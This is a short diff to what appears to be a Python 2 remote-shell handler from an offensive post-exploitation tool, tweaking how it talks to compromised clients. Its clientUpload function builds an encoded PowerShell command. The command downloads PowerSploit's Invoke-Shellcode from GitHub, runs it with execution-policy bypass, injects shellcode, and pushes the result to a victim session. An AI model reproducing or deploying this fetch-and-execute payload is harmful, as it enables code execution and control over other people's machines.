@@ -89,6 +89,8 @@ def interactShell(clientnumber):
     for server in serverlist:
         if clientnumber in server.handlers.keys():
             print "Commands\n" + "-"*50 + "\nback - Background Shell\nexit - Close Connection\n" + "-"*50
+            while server.handlers[clientnumber].in_buffer:
+                print server.handlers[clientnumber].in_buffer.pop()
             while True:
                 while sent:
                     if server.handlers[clientnumber].in_buffer:
@@ -111,7 +113,7 @@ def interactShell(clientnumber):
 
 def clientUpload(fileToUpload,clientnumber,powershellExec,isExe):
     newpayloadlayout = FUNCTIONS().powershellShellcodeLayout(powershellExec)
-    encPowershell = "IEX(New-Object Net.WebClient).DownloadString('https://github.com/PowerShellMafia/PowerSploit/raw/master/CodeExecution/Invoke-Shellcode.ps1');Start-Sleep 20;Invoke-Shellcode -Force -Shellcode @(%s)"%newpayloadlayout.rstrip(',')
+    encPowershell = "IEX(New-Object Net.WebClient).DownloadString('https://github.com/PowerShellMafia/PowerSploit/raw/master/CodeExecution/Invoke-Shellcode.ps1');Start-Sleep 30;Invoke-Shellcode -Force -Shellcode @(%s)"%newpayloadlayout.rstrip(',')
     encPowershell = base64.b64encode(encPowershell.encode('UTF-16LE'))
     powershellExec = "$Arch = (Get-Process -Id $PID).StartInfo.EnvironmentVariables['PROCESSOR_ARCHITECTURE'];if($Arch -eq 'x86'){powershell -exec bypass -enc \"%s\"}elseif($Arch -eq 'amd64'){$powershell86 = $env:windir + '\SysWOW64\WindowsPowerShell\\v1.0\powershell.exe';& $powershell86 -exec bypass -enc \"%s\"}"%(encPowershell,encPowershell)
     clientnumber = int(clientnumber)
@@ -119,4 +121,3 @@ def clientUpload(fileToUpload,clientnumber,powershellExec,isExe):
     for server in serverlist:
         if clientnumber in server.handlers.keys():
             server.handlers[clientnumber].out_buffer.append(powershellExec)
-            print server.handlers[clientnumber].out_buffer
